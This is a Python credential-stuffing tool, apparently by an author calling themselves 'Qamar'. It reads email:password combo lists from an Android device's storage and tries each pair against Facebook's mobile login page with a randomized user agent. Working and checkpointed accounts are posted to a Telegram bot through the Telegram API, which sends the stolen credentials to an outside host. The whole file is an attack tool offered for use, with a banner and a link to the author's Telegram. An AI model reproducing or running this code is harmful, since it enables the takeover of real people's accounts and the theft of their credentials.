import os
try:
    import requests, time, webbrowser, user_agent
except:
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install webbrowser')
    pass
from user_agent import generate_user_agent
os.system('pip install user_agent')
agent = generate_user_agent()
mrdm = requests.session()
os.system('cls')
good = 0
check = 0
err = 0
logo = '''

 ██╗ █████╗  ██╗██╗  ██╗    ████████╗███╗   ███╗
███║██╔══██╗███║██║  ██║    ╚══██╔══╝████╗ ████║
╚██║╚██████║╚██║███████║       ██║   ██╔████╔██║
 ██║ ╚═══██║ ██║╚════██║       ██║   ██║╚██╔╝██║
 ██║ █████╔╝ ██║     ██║       ██║   ██║ ╚═╝ ██║
 ╚═╝ ╚════╝  ╚═╝     ╚═╝       ╚═╝   ╚═╝     ╚═╝

       [Qamar - Coder] - FB > Kak Qamar                              
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n
'''
webbrowser.open('https://t.me/i4m_qamar')
print(logo)
Tele_ID = str(input('[+] ID Telegram : '))
Tele_TK = str(input('[+] Token Telegram : '))
os.system('cls')
print(logo)
combooo = '/sdcard/Qamar-List.txt'
comboooo= open(combooo, 'r')
while True:
    Comb = comboooo.readline().split('\n')[0]
    Mail = Comb.split(':')[0]
    Pasw = Comb.split(':')[1]
    Url = 'https://mobile.facebook.com/login.php'
    data = { 'email': Mail, 'pass': Pasw }
    headers = {'User-Agent' : agent}
    login = mrdm.post(Url, headers=headers, data=data).text
    if "xc_message" in login:
        os.system('cls')
        print(logo)
        good+=1
        print(f"[+] Good : {good} | [-] Check : {check} | [!] Error : {err}")
        wara_wara_asmare = f'Good \nEmail : {Mail}\nPass : {Pasw}\nTelegram @i4m_qamar'
        mrdm.post(f"https://api.telegram.org/bot{Tele_TK}/sendMessage?chat_id={Tele_ID}&text={wara_wara_asmare}")
    elif "checkpointSubmitButton-actual-button" in login:
        os.system('cls')
        print(logo)
        check+=1
        print(f"[-] Checkpoint : {good} | [-] Check : {check} | [!] Error : {err}")
        wara_wara_asmare = f'Checkpoint \nEmail : {Mail} | Pass : {Pasw}\nTelegram @i4m_qamar'
        mrdm.post(f"https://api.telegram.org/bot{Tele_TK}/sendMessage?chat_id={Tele_ID}&text={wara_wara_asmare}")
    else:
        os.system('cls')
        print(logo)
        err+=1
        print(f"[!] Error : {good} | [-] Check : {check} | [!] Error : {err}")
        


